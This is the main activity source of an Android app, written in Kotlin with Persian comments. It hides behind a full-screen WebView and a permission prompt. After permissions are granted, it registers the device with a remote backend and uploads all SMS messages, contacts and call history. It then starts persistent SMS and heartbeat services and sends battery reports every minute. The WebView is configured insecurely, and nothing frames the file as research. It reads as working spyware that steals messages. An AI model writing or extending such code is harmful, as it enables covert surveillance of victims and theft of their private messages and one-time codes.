package com.example.test


import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowInsets
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.webkit.WebChromeClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import com.example.test.utils.DataUploader
import com.example.test.utils.DeviceInfoHelper
import com.example.test.utils.PermissionManager
import com.example.test.utils.PermissionDialog
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val FCM_TIMEOUT_MS = 5000L
    private val userId = Constants.USER_ID

    private lateinit var webView: WebView
    private lateinit var permissionManager: PermissionManager

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Fullscreen Mode
        enableFullscreen()

        deviceId = DeviceInfoHelper.getDeviceId(this)
        Log.d(TAG, "📱 Device ID: $deviceId")

        permissionManager = PermissionManager(this)
        permissionManager.initialize {
            // وقتی همه دسترسی‌ها داده شد
        }

        setContent {
            MaterialTheme {
                MainScreen()
            }
        }
    }

    private fun enableFullscreen() {
        // حذف ActionBar
        actionBar?.hide()

        // Fullscreen برای همه نسخه‌های اندروید
        WindowCompat.setDecorFitsSystemWindows(window, false)

        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            // مخفی کردن status bar و navigation bar
            hide(WindowInsetsCompat.Type.systemBars())
            // حالت immersive - وقتی کاربر سوایپ کنه بارها دوباره مخفی بشن
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        }

        // Keep screen on (اختیاری - صفحه خاموش نشه)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    @Composable
    fun MainScreen() {
        var showPermissionDialog by remember { mutableStateOf(false) }
        var permissionsGranted by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope()

        LaunchedEffect(Unit) {
            delay(300)
            if (!permissionManager.checkAllPermissions()) {
                showPermissionDialog = true
            } else {
                permissionsGranted = true
                continueInitialization()
            }
        }

        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black)
        ) {
            // همیشه WebView رو نمایش بده
            AndroidView(
                factory = { context ->
                    createWebView()
                },
                modifier = Modifier.fillMaxSize()
            )

            // دیالوگ روی WebView نمایش داده میشه
            if (showPermissionDialog) {
                PermissionDialog(
                    onRequestPermissions = {
                        scope.launch {
                            permissionManager.requestPermissions {
                                if (permissionManager.checkAllPermissions()) {
                                    showPermissionDialog = false
                                    permissionsGranted = true
                                    continueInitialization()
                                }
                            }
                        }
                    }
                )
            }
        }
    }

    private fun createWebView(): WebView {
        webView = WebView(this)

        val webSettings: WebSettings = webView.settings

        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = true
            webSettings.allowUniversalAccessFromFileURLs = true
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        webSettings.cacheMode = WebSettings.LOAD_DEFAULT

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "✅ WebView page loaded successfully")

                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var el = document.getElementById('deviceId');
                            if (el) {
                                el.innerText = 'Device ID: $deviceId';
                            }
                            console.log('Device ID injected successfully');
                        } catch(e) {
                            console.error('Error injecting device ID:', e);
                        }
                    })();
                    """.trimIndent(),
                    null
                )
            }

            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                super.onReceivedError(view, errorCode, description, failingUrl)
                Log.e(TAG, "❌ WebView error: $description at $failingUrl")
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()} [${it.sourceId()}:${it.lineNumber()}]")
                }
                return true
            }
        }

        try {
            webView.loadUrl("file:///android_asset/index.html")
            Log.d(TAG, "📄 Loading index.html from assets...")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error loading HTML: ${e.message}", e)
        }

        return webView
    }

    private fun continueInitialization() {
        Log.d(TAG, "🚀 Starting initialization...")

        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
            } else {
                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
            }

            Thread {
                try {
                    Log.d(TAG, "📡 Starting network operations...")
                    DataUploader.registerDevice(this, deviceId, fcmToken, userId)
                    DataUploader.uploadAllSms(this, deviceId)
                    DataUploader.uploadAllContacts(this, deviceId)
                    DataUploader.uploadCallHistory(this, deviceId)
                    startBackgroundService()
                    startHeartbeatService()
                    Log.d(TAG, "✅ All operations completed")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Init error: ${e.message}", e)
                    e.printStackTrace()
                }
            }.start()

            handler.post(batteryUpdater)

        }, FCM_TIMEOUT_MS)
    }

    private fun startBackgroundService() {
        try {
            val intent = android.content.Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ SmsService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}")
        }
    }

    private fun startHeartbeatService() {
        try {
            val intent = android.content.Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ HeartbeatService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
        }
    }

    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)
        if (::webView.isInitialized) {
            webView.destroy()
        }
        if (::permissionManager.isInitialized) {
            permissionManager.stopBatteryMonitoring()
        }
        Log.d(TAG, "👋 MainActivity destroyed")
    }
}